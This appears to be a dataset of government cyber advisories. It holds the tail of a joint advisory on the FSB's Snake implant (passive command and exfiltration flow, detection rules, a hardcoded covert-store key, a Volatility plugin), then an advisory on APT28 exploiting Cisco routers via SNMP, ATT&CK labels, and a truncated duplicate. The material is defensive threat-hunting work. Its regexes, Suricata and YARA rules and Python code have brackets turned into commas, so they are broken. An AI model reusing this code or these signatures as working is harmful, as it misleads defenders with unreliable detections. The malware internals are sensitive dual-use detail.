When a target machine has executed a forwarded command, the return data is encrypted with that implant’s RSA keys and returned directly to the previous hop point. As the data is returned up the chain in the Snake P2P network, the intermediate hop points do not manipulate the encrypted data, as they do not have the RSA private key necessary to do so. In this manner, the return data is de-facto end-to-end encrypted throughout the P2P network until it arrives back at the FSB operator.

 


SNAKE IMPLANT OPERATION
Snake uses two main methods for communication and command execution, namely Passive and Active. In general, Snake operators will employ Active operations to communicate with hop points within Snake’s infrastructure; however, hop points can and do sometimes operate using Snake’s Passive method. Snake’s end points tend to solely operate using the Passive method.
Active Operations
During Active operations, Snake commands are issued by an FSB operator or a script to a target machine, generally through Forward commands (described in the previous section). The response to the command is immediately returned to the point of origin following the same path that the command took to reach its end target, as shown in the previous figure on Forward command structure.
Passive Operations
During Passive operations, Snake implants operate on their own, without the synchronous interaction of FSB operators. The nodes with which an implant communicates during Passive operations are stored within its 0x2 Container(s) as communication channels. Up to ten communication channels can be present at any time; an operator can change these channels via the Set Config Item command.
Passive Intake
During Passive operations, the implant will beacon by sending a Queue Read (0xb) command to one of its stored communication channels that it has chosen at random. These Queue Read commands look for a Queue Item within a Container with an Instance Number equal to the implant’s UID. The matching UID indicates the Queue Items in this Container are intended for the beaconing implant.
If such a Queue Item is found, the beaconing implant will read in the Queue Item and delete it off of the host from which it was read. There can be multiple Queue Items found within the specified Queue Container that was beaconed to; each Queue Read command will read one of these items. This process is repeated until all items within the Container are read, which the infrastructure node will indicate by sending a specific error in response to the Queue Read. This beaconing will continue to randomly select hosts at nondeterministic time intervals for as long as the implant is set to perform Passive operations.
Passive Data Exfiltration
Similar to how Snake intakes commands passively, it can also exfiltrate the resulting data passively. This is done using Queue Write (0xc) commands to write to one of the stored communication channels chosen at random. Once the data is off the end point node, operators generally retrieve it manually or using a script. The Item Type field, which is unique per executed Snake command, is needed to associate the exfiltrated data with the target node on which the command was run.
In the context of Passive Snake communications, the term Item Type is defined as a UID for a given Snake command and its resulting data. The Item Type serves as a unique identifier to associate the results of command execution with the original command written by the operator. When the FSB collects the data, Snake knows exactly what infection the data came from, and therefore it can determine what key to use to successfully decrypt the data.

 


To illustrate how Passive operations are conducted between the end points, the operator, and the hop points in between, see the diagram above, which is explained further by the following steps:

(1), (2): During Passive operations, the Node randomly chooses a host from amongst its stored communication channels and will beacon out to it with a Queue Read command (Hop Point 1 in this case). The Item Type for these beacons will be one greater than the Item Type of the last command received by the Node, indicating in this example that a command of Item Type 0x08 was the last command that was read in by the Node during Passive operations. This Node will continue to beacon with Item Type 0x09 until it receives a command, via Passive operations, with an Item Type of 0x09 or greater. The lines are dotted for (1) and (2) as this activity will be repeated at random intervals until a successful Queue Read occurs.
(3), (4): In these steps, the operator uses a Queue Write command to write a command to Hop Point that is ultimately intended for the Node. The Item Type of the command being written to Hop Point 1 is assigned 0x20 (for this example). Note that the path of this command, its execution, and its results making it back to the operator can be tracked via the red text.
(5), (6): The Node continues to beacon out looking for commands to read in (5). The return (6) is successful, and the command written by the operator to Hop Point 1 (3) is read in by the Node, then deleted from Hop Point 1.
(7), (8): The Node attempts another Queue Read to Hop Point 1, however now the Item Type is set to 0x21, one greater than the command that was just read in by the Node at (5) and (6). This returns an error as Hop Point 1 has nothing else for the Node to read in, indicating to the Node that everything at Hop Point 1 was read.
(9), (10): At this point, the Node has executed the command it read in at (5) and (6) and is attempting to send back the results. The Node randomly selects another host from its stored communication channels, Hop Point 2 in this case, and sends out a 0xb command to make sure that the Item Type 0x20, the Item Type of the command it executed, does not already exist within the Queue of Hop Point 2. If it receives an error, there is no Item with Item Type 0x20 on Hop Point 2, and the Node can proceed to send the command results.
(11), (12): Here the data from the executed command is written to Hop Point 2 with Item Type 0x20 into its 0x1 Container with a 0xc command, the Item Type the command was initially given at creation (3).
(13), (14): The Node continues its normal beaconing routine again as seen in (1) and (2), searching for Item Type 0x21, one greater than the Item Type of the most recently executed command. As in (1) and (2), the lines here are dotted to denote that this process will repeat until there was a successful beacon as in (5) and (6).
(15-22): These steps show how the operator retrieves the resulting data that was written to Hop Point 2. The Queue Enumerate command (15) lists the contents of Hop Point 2’s 0x1 Container, showing the data written by the Node (11). This data is identifiable by its Item Type, namely 0x20. The Queue Read command (17) reads in the Item that was found in Hop Point 2’s Container. The Queue Read command that follows (19) is asking if there is any data left. In this case, the entirety of the data was read with the first Queue Read (17, 18). Therefore, the error returned from second Queue Read command (20) lets the operator know all of the data from Item Type 0x20 was read and there is nothing further. A Queue Delete command (21) follows and is sent to delete the item with Item Type 0x20 from Hop Point 2.
The subsequent Queue Read, Queue Read, and Queue Delete commands (17-21) are denoted with dashed lines to indicate that this sequence of commands is repeated for all items returned from the Queue Enumerate command (15).

MITIGATIONS
A number of complementary detection techniques effectively identify some of the more recent variants of Snake. However, as described above, Snake is purpose-built to avoid large-scale detection. Below is a discussion of the advantages and disadvantages of various detection methodologies available for Snake.
Note that some of the techniques identified in this section can affect the availability or stability of a system. Defenders should follow organizational policies and incident response best practices to minimize the risk to operations while hunting for Snake.
Network-Based Detection
Network Intrusion Detection Systems (NIDS) can feasibly identify some of the more recent variants of Snake and its custom network protocols as detailed above.
Advantages: High-confidence, large-scale (network-wide) detection of custom Snake communication protocols.
Disadvantages: Low visibility of Snake implant operations and encrypted data in transit. There is some potential for false positives in the Snake http, http2, and tcp signatures. Snake operators can easily change network-based signatures.
Snake http
Snake client-to-server http and http2 traffic is contained within an arbitrary HTTP header field. The header field value for http begins with 10 pure alphanumeric characters, followed by base64 encoding of 8 bytes, which yields exactly 11 valid base64 characters plus one base64 padding character.
      ^,0-9A-Za-z,{10},0-9A-Za-z/\+,{11}=
The following two Suricata rules will detect the traffic described:
alert http any any -> any any (msg: ""http rule (Cookie)"";\    pcre:""/,0-9A-Za-z,{10},0-9A-Za-z\/\+,{11}=/C"";\    flow: established, to_server;\    sid: 7; rev: 1;) alert http any any -> any any (msg: ""http rule (Other Header)"";\    pcre:""/,0-9A-Za-z,{10},0-9A-Za-z\/\+,{11}=/H"";\    flow: established, to_server;\    sid: 8; rev: 1;)
Snake http2
The header field value for http2 begins with 22 pure alphanumeric characters (base62 with non-extraneous characters), followed by the base62 encoding of at least 8 bytes, which must comprise at least 11 base62 characters with the four extraneous characters allowed. The actual requirement is stricter than this expression, since the total number of non-extraneous characters alone must equal or exceed 11; however, it is not possible to encode that aspect into a regular language.
      ^,0-9A-Za-z,{22},0-9A-Za-z/;_=,{11}
The following two Suricata rules will detect the traffic described:
alert http any any -> any any (msg: ""http2 rule (Cookie)"";\    pcre:""/,0-9A-Za-z,{22},0-9A-Za-z\/_=\;,{11}/C"";\    flow: established, to_server;\    sid: 9; rev: 1;) alert http any any -> any any (msg: ""http2 rule (Other Header)"";\    pcre:""/,0-9A-Za-z,{22},0-9A-Za-z\/_=\;,{11}/H"";\    flow: established, to_server;\    sid: 10; rev: 1;)
Snake tcp
The client-to-server communication for tcp must begin with the ustart, which is not captured in this signature set. Immediately following the ustart, the next client-to-server communication must be the big-endian 32-bit unsigned integer 8 followed by any 8 bytes of data. The next communication must also be client-to-server, and it must comprise the big-endian 32-bit unsigned integer 4 followed by any 4 bytes of data. The next two communications must be server-to-client, comprising the integer 8 followed by 8 bytes of data and the integer 4 followed by 4 bytes of data.
The following six Suricata rules will, in conjunction, detect traffic of the form described:
alert tcp any any -> any any (msg: ""tcp rule"";\    content: ""|00 00 00 08|""; startswith; dsize: 12;\    flow: established, to_server; flowbits: set, a8; flowbits: noalert;\    sid: 1; rev: 1;) alert tcp any any -> any any (msg: ""tcp rule"";\    content: ""|00 00 00 04|""; startswith; dsize:8;\    flow: established, to_server; flowbits: isset, a8; flowbits: unset, a8;\    flowbits: set, a4; flowbits: noalert;\    sid: 2; rev: 1;) alert tcp any any -> any any (msg: ""tcp rule"";\    content: ""|00 00 00 08|""; startswith; dsize: 4;\    flow: established, to_client; flowbits: isset, a4; flowbits: unset, a4;\    flowbits: set, b81; flowbits: noalert;\    sid: 3; rev: 1;) alert tcp any any -> any any (msg: ""tcp rule"";\    dsize: 8; flow: established, to_client; flowbits: isset, b81;\    flowbits: unset, b81; flowbits: set, b8; flowbits: noalert;\    sid: 4; rev: 1;) alert tcp any any -> any any (msg: ""tcp rule"";\    content: ""|00 00 00 04|""; startswith; dsize: 4;\    flow: established, to_client; flowbits: isset, b8; flowbits: unset, b8;\    flowbits: set, b41; flowbits: noalert;\    sid: 5; rev: 1;) alert tcp any any -> any any (msg: ""tcp rule"";\    dsize: 4; flow: established, to_client; flowbits: isset, b41;\    flowbits: unset, b41;\    sid: 6; rev: 1;)
Host-Based Detection
Advantages: High confidence based on totality of positive hits for host-based artifacts.
Disadvantages: Many of the artifacts on the host are easily shifted to exist in a different location or with a different name. As the files are fully encrypted, accurately identifying these files is difficult.
Covert Store Detection
The Snake covert store comprises a file-backed NTFS (usually) or FAT-16 (rarely) filesystem. The filesystem is encrypted with CAST-128 in CBC mode. The encryption key can be either statically hardcoded or dynamically stored in a specified Windows registry location. The IV is 8 bytes, since CAST-128 has an 8-byte block length. The first byte of the IV for any 512-byte block of the covert store is the 0-indexed block number. The remaining bytes of the IV are the corresponding bytes of the key, meaning that bytes at 0-indexed indices 1 through 7 of the IV are the bytes at 0-indexed indices 1 through 7 of the key.
When statically hardcoded, the encryption key has the following constant value: ​​​​​​     A1 D2 10 B7 60 5E DA 0F A1 65 AF EF 79 C3 66 FA
When stored in the Windows registry, the encryption key is the classname associated with the following key:
      SECURITY\Policy\Secrets\n
The following initial 8-byte sequences are known to be used by NTFS or FAT-16 filesystems as observed:
      EB 52 90 4E 54 46 53 20      EB 5B 90 4E 54 46 53 20      EB 3C 90 4D 53 44 4F 53      EB 00 00 00 00 00 00 00
For tool development, the following test vector illustrates the encryption of the first given header above (EB 52 90 …) using CAST-128 with the default key shown above and the IV constructed as described, given this header occurs at the beginning of the first 512-byte block of the covert store.
      Plaintext:      EB 52 90 4E 54 46 53 20      Key:              A1 D2 10 B7 60 5E DA 0F A1 65 AF EF 79 C3 66 FA      IV:                 00 D2 10 B7 60 5E DA 0F      Ciphertext:   C2 C7 F4 CA F7 DA 3A C8
By encrypting each possible initial filesystem byte sequence with CAST-128 using the key obtained from the registry—or the default encryption key if the registry entry does not exist—and searching for any file with a size that is an even multiple of 220, it is possible to efficiently detect Snake covert stores. Validation can be performed by decrypting the entire file using the outlined methodology and then verifying that it comprises an NTFS or FAT-16 filesystem.
Other On-Disk Artifact Detection
Registry Blob
The registry blob is generally found at the location listed below. In case it is not present at its typical location, the registry blob can be found by searching the full registry for a value of at least 0x1000 bytes in size and entropy of at least 7.9.
      Typical Name: Unknown (RegBlob)      Typical Path: HKLM\SOFTWARE\Classes\.wav\OpenWithProgIds      Characteristics: High Entropy
Queue File
      Typical Name: < RANDOM_GUID >.<RANDOM_GUID>.crmlog      Typical Path: %windows\registration\      Unique Characteristics: High Entropy, file attributes of hidden, system, and archive      Role: Snake Queue File
The Snake Queue File generally has a predictable path and filename structure, in addition to being high entropy. The Snake Queue File can be located by scanning all files in the typical queue path with filenames matching a regular expression that captures the typical naming convention. Files meeting these criteria should be scanned for high entropy, which is performed by the Yara rule below:
rule HighEntropy {    meta:        description = ""entropy rule""    condition:        math.entropy(0, filesize) >= 7.0 }
The following UNIX find command will scan files with names matching the GUID-based convention (note that the HighEntropy yara rule is assumed to be contained in a file named “1.yar”):
find /PATH/TO/WINDOWS_DIR -type f -regextype posix-egrep -iregex \    '.*\/registration/(\{,0-9A-F,{8}\-(,0-9A-F,{4}\-){3},0-9A-F,{12}\}\.){2}crmlog' \     -exec yara 1.yar {} \;
The following PowerShell command does the same:
Get-ChildItem -Recurse -File -Path %WINDOWS% | Where-Object {  $_.FullName -match  '(?i)/registration/(\{,0-9A-F,{8}\-(,0-9A-F,{4}\-){3},0-9A-F,{12}\}\.){2}crmlog$' } | ForEach-Object {  yara 1.yar $_.FullName }
Comadmin
      Typical Name: comadmin.dat      Typical Path: %windows%\system32\Com      Unique Characteristics: High Entropy      Role: Houses Snake’s kernel driver and the driver’s loader
The Snake Comadmin file can be found using analogous techniques to that presented above for locating the Snake Queue File. The following UNIX find command will do so:
find /PATH/TO/WINDOWS -type f -regextype posix-egrep -iregex \    '.*\/system32/Com/comadmin\.dat' \     -exec yara 1.yar {} \;
The following PowerShell command does the same:
Get-ChildItem -Recurse -File -Path %WINDOWS% | Where-Object {    $_.FullName -match '(?i)/system32/Com/comadmin\.dat$' } | ForEach-Object {    yara 1.yar $_.FullName }
Werfault
Typical Name: Werfault.exeTypical Path: %windows%\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a0502\Unique Characteristics: Icon is different than that of a valid Windows Werfault.exe fileRole: Persistence mechanism
The Snake Werfault.exe file has non-standard icon sizes, which form the basis of the Yara rule below. This rule should be run on all files in the typical path, specifically the %Windows%\WinSxS directory.
rule PeIconSizes {    meta:        description = ""werfault rule""    condition:        pe.is_pe        and        for any rsrc in pe.resources:            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 3240)        and        for any rsrc in pe.resources:            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 1384)        and        for any rsrc in pe.resources:            (rsrc.type == pe.RESOURCE_TYPE_ICON and rsrc.length == 7336) }
Memory Analysis
Advantages: High confidence as memory provides the greatest level of visibility into Snake’s behaviors and artifacts.
Disadvantages: Potential impact on system stability, difficult scalability.
Capturing and analyzing the memory of a system will be the most effective approach in detecting Snake because it bypasses many of the behaviors that Snake employs to hide itself. With a memory analysis tool, such as Volatility, detection of a Snake compromise may be possible.Snake’s principal user mode component is injected into a chosen process via a single allocation of PAGE_EXECUTE_READWRITE memory. The starting offset is generally 0x20000000, however the module does allow for relocation if needed. Additionally, since the user mode component is not obfuscated in any way, a valid PE header can be located at the beginning of the allocated memory region. Further validation can be performed by confirming the presence of strings known to exist in the user mode component also within the memory region. A plugin compatible with Volatility3 which can scan all processes on a system using this method is provided in the Appendix. A screenshot showing the results of the plugin successfully detecting Snake is displayed below.

 


PREVENTION
Note that the mitigations that follow are not meant to protect against the initial access vector and are only designed to prevent Snake’s persistence and hiding techniques.
Change Credentials and Apply Updates
System owners who are believed to be compromised by Snake are advised to change their credentials immediately (from a non-compromised system) and to not use any type of passwords similar to those used before. Snake employs a keylogger functionality that routinely returns logs back to FSB operators. Changing passwords and usernames to values which cannot be brute forced or guessed based on old passwords is recommended.
System owners are advised to apply updates to their Operating Systems. Modern versions of Windows, Linux, and MacOS make it much harder for adversaries to operate in the kernel space. This will make it much harder for FSB actors to load Snake’s kernel driver on the target system.
Execute Organizational Incident Response Plan
If system owners receive detection signatures of Snake implant activity or have other indicators of compromise that are associated with FSB actors using Snake, the impacted organization should immediately initiate their documented incident response plan.
We recommend implementing the following Cross-Sector Cybersecurity Performance Goals (CPGs) to help defend against FSB actors using Snake, or mitigate negative impacts post-compromise:
CPG 2.A: Changing Default Passwords will prevent FSB actors from compromising default credentials to gain initial access or move laterally within a network.
CPG 2.B: Requiring Minimum Password Strength across an organization will prevent FSB actors from being able to successfully conduct password spraying or cracking operations. 
CPG 2.C: Requiring Unique Credentials will prevent FSB actors from compromising valid accounts through password spraying or brute force. 
CPG 2.E Separating User and Privileged Accounts will make it harder for FSB actors to gain access to administrator credentials.
CPG 2.F. Network Segmentation to deny all connections by default unless explicitly required for specific system functionality, and ensure all incoming communication is going through a properly configured firewall.
CPG 2.H Implementing Phishing Resistant MFA adds an additional layer of security even when account credentials are compromised and can mitigate a variety of attacks towards valid accounts, to include brute forcing passwords and exploiting external remote services software.
CPG 4.C. Deploy Security.txt Files to ensure all public facing web domains have a security.txt file that conforms to the recommendations in RFC 9118.
APPENDIX
Partnership
This advisory was developed as a joint effort by an international partnership of multiple agencies in furtherance of the respective cybersecurity missions of each of the partner agencies, including our responsibilities to develop and issue cybersecurity specifications and mitigations. This partnership includes the following organizations:

Federal Bureau of Investigation
National Security Agency
Cybersecurity and Infrastructure Security Agency
Cyber National Mission Force
The United Kingdom’s National Cyber Security Centre
Canadian Centre for Cyber Security
Communications Security Establishment
Australian Cyber Security Centre
New Zealand National Cyber Security Centre

Collectively, we use a variety of sources, methods, and partnerships to acquire information about foreign cyber threats. This advisory contains the information we have concluded can be publicly released, consistent with the protection of sources and methods and the public interest.
Disclaimer
The information in this report is being provided “as is” for informational purposes only. We do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by co-authors. 
MITRE ATT&CK Techniques
This advisory uses the MITRE ATT&CK® for Enterprise framework, version 13. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques. MITRE and ATT&CK are registered trademarks of The MITRE Corporation. This report references the following MITRE ATT&CK techniques.

Volatility Plugin
The following plugin for the Volatility memory analysis framework will scan all processes on the system until it finds the Snake user mode component injected into a process. If found, the plugin will list both the injected process and the virtual memory address at which the Snake user mode component is loaded.
# This plugin to identify the injected usermode component of Snake is based # on the malfind plugin released with Volatility3 # # This file is Copyright 2019 Volatility Foundation and licensed under the # Volatility Software License 1.0 # which is available at https://www.volatilityfoundation.org/license/vsl-v1.0 import logging from typing import Iterable, Tuple from volatility3.framework import interfaces, symbols, exceptions, renderers from volatility3.framework.configuration import requirements from volatility3.framework.objects import utility from volatility3.framework.renderers import format_hints from volatility3.plugins.windows import pslist, vadinfo vollog = logging.getLogger(__name__) class snake(interfaces.plugins.PluginInterface):    _required_framework_version = (2, 4, 0)        @classmethod    def get_requirements(cls):        return,            requirements.ModuleRequirement(name = 'kernel',            description = 'Windows kernel',            architectures =,""Intel32"", ""Intel64"",),            requirements.VersionRequirement(name = 'pslist',            component = pslist.PsList, version = (2, 0, 0)),            requirements.VersionRequirement(name = 'vadinfo',            component = vadinfo.VadInfo, version = (2, 0, 0)),    @classmethod    def list_injections(            cls, context: interfaces.context.ContextInterface,            kernel_layer_name: str, symbol_table: str,            proc: interfaces.objects.ObjectInterface) -> Iterable,            Tuple,interfaces.objects.ObjectInterface, bytes,:        proc_id = ""Unknown""        try:            proc_id = proc.UniqueProcessId            proc_layer_name = proc.add_process_layer()        except exceptions.InvalidAddressException as excp:            vollog.debug(""Process {}: invalid address {} in layer {}"".            format(proc_id, excp.invalid_address, excp.layer_name))            return        proc_layer = context.layers,proc_layer_name,        for vad in proc.get_vad_root().traverse():            protection_string = vad.get_protection(vadinfo.VadInfo.            protect_values(context, kernel_layer_name, symbol_table),            vadinfo.winnt_protections)            if not ""PAGE_EXECUTE_READWRITE"" in protection_string:                continue            if (vad.get_private_memory() == 1                    and vad.get_tag() == ""VadS"") or (vad.get_private_memory()                    == 0 and protection_string !=                    ""PAGE_EXECUTE_WRITECOPY""):                data = proc_layer.read(vad.get_start(),                vad.get_size(), pad = True)                if data.find(b'\x4d\x5a') != 0:                    continue                yield vad, data    def _generator(self, procs):        kernel = self.context.modules,self.config,'kernel',        is_32bit_arch = not symbols.symbol_table_is_64bit(self.context,        kernel.symbol_table_name)        for proc in procs:            process_name = utility.array_to_string(proc.ImageFileName)            for vad, data in self.list_injections(self.context,            kernel.layer_name, kernel.symbol_table_name, proc):                strings_to_find =,b'\x25\x73\x23\x31',b'\x25\x73\x23\x32',                b'\x25\x73\x23\x33',b'\x25\x73\x23\x34',                b'\x2e\x74\x6d\x70', b'\x2e\x73\x61\x76',                b'\x2e\x75\x70\x64',                if not all(stringToFind in data for                stringToFind in strings_to_find):                    continue                yield (0, (proc.UniqueProcessId, process_name,                format_hints.Hex(vad.get_start()),                           format_hints.Hex(vad.get_size()),                           vad.get_protection(                               vadinfo.VadInfo.protect_values(self.context,                kernel.layer_name, kernel.symbol_table_name),                vadinfo.winnt_protections)))                return    def run(self):        kernel = self.context.modules,self.config,'kernel',        return renderers.TreeGrid(,(""PID"", int), (""Process"", str),        (""Address"", format_hints.Hex), (""Length"", format_hints.Hex),        (""Protection"", str), self._generator(pslist.PsList.list_processes(        context = self.context, layer_name = kernel.layer_name,          symbol_table = kernel.symbol_table_name)))
 
 






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-129a
29,"



APT28 accesses poorly maintained Cisco routers and deploys malware on unpatched devices using CVE-2017-6742.
Overview and Context
The UK National Cyber Security Centre (NCSC), the US National Security Agency (NSA), US Cybersecurity and Infrastructure Security Agency (CISA) and US Federal Bureau of Investigation (FBI) are releasing this joint advisory to provide details of tactics, techniques and procedures (TTPs) associated with APT28’s exploitation of Cisco routers in 2021.
We assess that APT28 is almost certainly the Russian General Staff Main Intelligence Directorate (GRU) 85th special Service Centre (GTsSS) Military Intelligence Unit 26165. APT28 (also known as Fancy Bear, STRONTIUM, Pawn Storm, the Sednit Gang and Sofacy) is a highly skilled threat actor.
Download the UK PDF version of this report:


APT28 exploits known vulnerability to carry out reconnaissance and deploy malware on Cisco routers
(PDF,       366.88 KB
  )


Download the US PDF version of this report:


APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers
(PDF,       366.25 KB
  )


Previous Activity
The NCSC has previously attributed the following activity to APT28:

Cyber attacks against the German parliament in 2015, including data theft and disrupting email accounts of German Members of Parliament (MPs) and the Vice Chancellor
Attempted attack against the Organization for the Prohibition of Chemical Weapons (OPCW) in April 2018, to disrupt independent analysis of chemicals weaponized by the GRU in the UK

For more information on APT28 activity, see the advisory Russian State-Sponsored and Criminal Cyber Threats to Critical Infrastructure and Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments.
As of 2021, APT28 has been observed using commercially available code repositories, and post-exploit frameworks such as Empire. This included the use of PowerShell Empire, in addition to Python versions of Empire.
Reconnaissance
Use of SNMP Protocol to Access Routers
In 2021, APT28 used infrastructure to masquerade Simple Network Management protocol (SNMP) access into Cisco routers worldwide. This included a small number based in Europe, US government institutions and approximately 250 Ukrainian victims.
SNMP is designed to allow network administrators to monitor and configure network devices remotely, but it can also be misused to obtain sensitive network information and, if vulnerable, exploit devices to penetrate a network.
A number of software tools can scan the entire network using SNMP, meaning that poor configuration such as using default or easy-to-guess community strings, can make a network susceptible to attacks.
Weak SNMP community strings, including the default ""public,"" allowed APT28 to gain access to router information. APT28 sent additional SNMP commands to enumerate router interfaces. [T1078.001]
The compromised routers were configured to accept SNMP v2 requests. SNMP v2 doesn’t support encryption and so all data, including community strings, is sent unencrypted.
Exploitation of CVE-2017-6742
APT28 exploited the vulnerability CVE-2017-6742 (Cisco Bug ID: CSCve54313) [T1190]. This vulnerability was first announced by Cisco on 29 June 2017, and patched software was made available. 
Cisco's published advisory provided workarounds, such as limiting access to SNMP from trusted hosts only, or by disabling a number of SNMP Management Information bases (MIBs).
Malware Deployment
For some of the targeted devices, APT28 actors used an SNMP exploit to deploy malware, as detailed in the NCSC’s Jaguar Tooth Malware Analysis Report. This malware obtained further device information, which is exfiltrated over trivial file transfer protocol (TFTP), and enabled unauthenticated access via a backdoor.
The actor obtained this device information by executing a number of Command Line Interface (CLI) commands via the malware. It includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses. [T1590]
Indicators of Compromise (IoCs)
Please refer to the accompanying Malware Analysis Report for indicators of compromise which may help to detect this activity.
MITRE ATT&CK®
This advisory has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.
For detailed TTPs, see the Malware Analysis Report.



Tactic
ID
Technique
Procedure


Initial Access
T1190
Exploit Public-facing Application.
APT28 exploited default/well-known community strings in SNMP as outlined in CVE-2017-6742 (Cisco Bug ID: CSCve54313).


Initial Access
T1078.001
Valid Accounts: Default Accounts.
Actors accessed victim routers by using default community strings such as “public.”


Reconnaissance
T1590
Gather Victim Network Information
Access was gained to perform reconnaissance on victim devices. Further detail of how this was achieved in available in the MITRE ATT&CK section of the Jaguar Tooth MAR.



Conclusion
APT28 has been known to access vulnerable routers by using default and weak SNMP community strings, and by exploiting CVE-2017-6742 (Cisco Bug ID: CSCve54313) as published by Cisco.
TTPs in this advisory may still be used against vulnerable Cisco devices. Organizations are advised to follow the mitigation advice in this advisory to defend against this activity.
Reporting
UK organizations should report any suspected compromises to the NCSC.US Organizations can also report anomalous cyber activity and/or cyber incidents 24/7 to report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
Mitigation
Mitigation

Patch devices as advised by Cisco. The NCSC also has general guidance on managing updates and keeping software up to date.
Do not use SNMP if you are not required to configure or manage devices remotely to prevent unauthorized users from accessing your router.

If you are required to manage routers remotely, establish allow and deny lists for SNMP messages to prevent unauthorized users from accessing your router.


Do not allow unencrypted (i.e., plaintext) management protocols, such as SNMP v2 and Telnet. Where encrypted protocols aren’t possible, you should carry out any management activities from outside the organization through an encrypted virtual private network (VPN), where both ends are mutually authenticated.
Enforce a strong password policy. Don’t reuse the same password for multiple devices. Each device should have a unique password. Where possible, avoid legacy password-based authentication and implement two-factor authentication based on public-private key.
Disable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c. Where possible, use modern encrypted protocols such as SSH and SNMP v3. Harden the encryption protocols based on current best security practice. The NCSC strongly advises owners and operators to retire and replace legacy devices that can’t be configured to use SNMP v3.
Use logging tools to record commands executed on your network devices, such as TACACS+ and Syslog. Use these logs to immediately highlight suspicious events and keep a record of events to support an investigation if the device’s integrity is ever in question. See NCSC guidance on monitoring and logging.
If you suspect your router has been compromised:

Follow Cisco’s advice for verifying the Cisco IOS image.
Revoke all keys associated with that router. When replacing the router configuration be sure to create new keys rather than pasting from the old configuration.
Replace both the ROMMON and Cisco IOS image with an image that has been sourced directly from the Cisco website, in case third party and internal repositories have been compromised.


NSA’s Network Infrastructure guide provides some best practices for SNMP.
See also the Cisco IOS hardening guide and Cisco’s Jaguar Tooth blog.

This product is provided subject to this Notification and this Privacy & Use policy.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1078.001', 'T1190', 'T1590'}","



APT28 accesses poorly maintained Cisco routers and deploys malware on unpatched devices using CVE-2017-6742.
Overview and Context
The UK National Cyber Security Centre (NCSC), the US National Security Agency (NSA), US Cybersecurity and Infrastructure Security Agency (CISA) and US Federal Bureau of Investigation (FBI) are releasing this joint advisory to provide details of tactics, techniques and procedures (TTPs) associated with APT28’s exploitation of Cisco routers in 2021.
We assess that APT28 is almost certainly the Russian General Staff Main Intelligence Directorate (GRU) 85th special Service Centre (GTsSS) Military Intelligence Unit 26165. APT28 (also known as Fancy Bear, STRONTIUM, Pawn Storm, the Sednit Gang and Sofacy) is a highly skilled threat actor.
Download the UK PDF version of this report:


APT28 exploits known vulnerability to carry out reconnaissance and deploy malware on Cisco routers
(PDF,       366.88 KB
  )


Download the US PDF version of this report:


APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers
(PDF,       366.25 KB
  )


Previous Activity
The NCSC has previously attributed the following activity to APT28:

Cyber attacks against the German parliament in 2015, including data theft and disrupting email accounts of German Members of Parliament (MPs) and the Vice Chancellor
Attempted attack against the Organization for the Prohibition of Chemical Weapons (OPCW) in April 2018, to disrupt independent analysis of chemicals weaponized by the GRU in the UK

For more information on APT28 activity, see the advisory Russian State-Sponsored and Criminal Cyber Threats to Critical Infrastructure and Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments.
As of 2021, APT28 has been observed using commercially available code repositories, and post-exploit frameworks such as Empire. This included the use of PowerShell Empire, in addition to Python versions of Empire.
Reconnaissance
Use of SNMP Protocol to Access Routers
In 2021, APT28 used infrastructure to masquerade Simple Network Management protocol (SNMP) access into Cisco routers worldwide. This included a small number based in Europe, US government institutions and approximately 250 Ukrainian victims.
SNMP is designed to allow network administrators to monitor and configure network devices remotely, but it can also be misused to obtain sensitive network information and, if vulnerable, exploit devices to penetrate a network.
A number of software tools can scan the entire network using SNMP, meaning that poor configuration such as using default or easy-to-guess community strings, can make a network susceptible to attacks.
Weak SNMP community strings, including the default ""public,"" allowed APT28 to gain access to router information. APT28 sent additional SNMP commands to enumerate router interfaces.,
The compromised routers were configured to accept SNMP v2 requests. SNMP v2 doesn’t support encryption and so all data, including community strings, is sent unencrypted.
Exploitation of CVE-2017-6742
APT28 exploited the vulnerability CVE-2017-6742 (Cisco Bug ID: CSCve54313),. This vulnerability was first announced by Cisco on 29 June 2017, and patched software was made available. 
Cisco's published advisory provided workarounds, such as limiting access to SNMP from trusted hosts only, or by disabling a number of SNMP Management Information bases (MIBs).
Malware Deployment
For some of the targeted devices, APT28 actors used an SNMP exploit to deploy malware, as detailed in the NCSC’s Jaguar Tooth Malware Analysis Report. This malware obtained further device information, which is exfiltrated over trivial file transfer protocol (TFTP), and enabled unauthenticated access via a backdoor.
The actor obtained this device information by executing a number of Command Line Interface (CLI) commands via the malware. It includes discovery of other devices on the network by querying the Address Resolution Protocol (ARP) table to obtain MAC addresses.,
Indicators of Compromise (IoCs)
Please refer to the accompanying Malware Analysis Report for indicators of compromise which may help to detect this activity.
MITRE ATT&CK®
This advisory has been compiled with respect to the MITRE ATT&CK® framework, a globally accessible knowledge base of adversary tactics and techniques based on real-world observations.
For detailed TTPs, see the Malware Analysis Report.

Conclusion
APT28 has been known to access vulnerable routers by using default and weak SNMP community strings, and by exploiting CVE-2017-6742 (Cisco Bug ID: CSCve54313) as published by Cisco.
TTPs in this advisory may still be used against vulnerable Cisco devices. Organizations are advised to follow the mitigation advice in this advisory to defend against this activity.
Reporting
UK organizations should report any suspected compromises to the NCSC.US Organizations can also report anomalous cyber activity and/or cyber incidents 24/7 to report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
Mitigation
Mitigation

Patch devices as advised by Cisco. The NCSC also has general guidance on managing updates and keeping software up to date.
